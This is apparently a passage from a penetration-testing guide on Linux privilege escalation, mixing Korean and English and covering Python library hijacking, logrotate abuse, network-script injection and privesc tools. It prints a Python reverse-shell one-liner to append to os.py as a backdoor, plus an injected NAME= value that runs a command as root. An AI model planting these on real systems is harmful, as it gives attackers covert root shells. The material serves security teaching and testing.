~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### 일반 Creds Search/Regex

파일의 **이름** 또는 **내용**에 "**password**"라는 단어가 포함된 파일도 확인해야 하고, 로그 안의 IP와 이메일 또는 해시 정규식도 확인해야 합니다.\
여기에 이 모든 것을 수행하는 방법을 일일이 적지는 않겠지만 관심이 있다면 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)가 수행하는 최신 검사들을 확인해보세요.

## 쓰기 가능한 파일

### Python 라이브러리 hijacking

만약 **어디에서** python 스크립트가 실행될지 알고 그 폴더에 **쓸 수 있다**거나 **python 라이브러리를 수정할 수 있다**면, OS 라이브러리를 수정해 backdoor를 심을 수 있습니다 (python 스크립트가 실행되는 위치에 쓸 수 있다면 os.py 라이브러리를 복사해 붙여넣으세요).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate 악용

A vulnerability in `logrotate` lets users with **write permissions** on a log file or its parent directories potentially gain escalated privileges. This is because `logrotate`, often running as **root**, can be manipulated to execute arbitrary files, especially in directories like _**/etc/bash_completion.d/**_. It's important to check permissions not just in _/var/log_ but also in any directory where log rotation is applied.

> [!TIP]
> 이 취약점은 `logrotate` 버전 `3.18.0` 및 이전에 영향을 미칩니다

More detailed information about the vulnerability can be found on this page: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

You can exploit this vulnerability with [**logrotten**](https://github.com/whotwagner/logrotten).

This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

어떤 이유로든 사용자가 `ifcf-<whatever>` 스크립트를 _/etc/sysconfig/network-scripts_에 **작성**할 수 있거나 기존 것을 **수정**할 수 있다면, 당신의 **system is pwned**.

네트워크 스크립트(예: _ifcg-eth0_)는 네트워크 연결에 사용됩니다. 이들은 .INI 파일과 정확히 같은 형식으로 보입니다. 그러나, 이는 Linux에서 Network Manager (dispatcher.d)에 의해 \~sourced\~ 됩니다.

제가 본 사례에서는 이러한 네트워크 스크립트의 `NAME=` 속성이 올바르게 처리되지 않습니다. **이름에 공백(빈칸)이 있으면 시스템은 공백 이후의 부분을 실행하려고 시도합니다**. 이는 **첫 번째 공백 이후의 모든 것이 root로 실행됩니다**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network와 /bin/id 사이의 공백에 주의하세요_)

### **init, init.d, systemd, and rc.d**

디렉터리 `/etc/init.d`는 System V init (SysVinit)을 위한 **스크립트**의 저장소입니다(전통적인 Linux 서비스 관리 시스템). 여기에는 서비스를 `start`, `stop`, `restart`, 그리고 때로는 `reload`하기 위한 스크립트들이 포함되어 있습니다. 이 스크립트들은 직접 실행하거나 `/etc/rc?.d/`에 있는 심볼릭 링크를 통해 실행할 수 있습니다. Redhat 시스템에서는 대안 경로로 `/etc/rc.d/init.d`가 사용됩니다.

반면 `/etc/init`은 **Upstart**와 연관되어 있으며, Ubuntu에서 도입된 더 새로운 **서비스 관리** 시스템으로 서비스 관리 작업을 위한 설정 파일을 사용합니다. Upstart로의 전환이 있었음에도 불구하고, Upstart의 호환성 계층 때문에 SysVinit 스크립트는 여전히 Upstart 설정과 함께 사용됩니다.

**systemd**는 현대적인 초기화 및 서비스 관리자으로 등장했으며, 요구 시 데몬 시작(on-demand daemon starting), automount 관리, 시스템 상태 스냅샷(system state snapshots)과 같은 고급 기능을 제공합니다. 배포 패키지용 파일은 `/usr/lib/systemd/`에, 관리자의 수정용 파일은 `/etc/systemd/system/`에 정리되어 시스템 관리 과정을 간소화합니다.

## 기타 트릭

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks는 일반적으로 syscall을 훅(hook)하여 privileged kernel 기능을 userspace manager에 노출합니다. 관리자 인증이 약한 경우(예: FD-order 기반의 서명 검사 또는 취약한 비밀번호 체계) 로컬 앱(local app)이 manager를 가장하여 이미 root된 기기에서 root로 권한 상승할 수 있습니다. 자세한 내용과 익스플로잇 세부사항은 다음을 참조하세요:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)


{{#include ../../banners/hacktricks-training.md}}
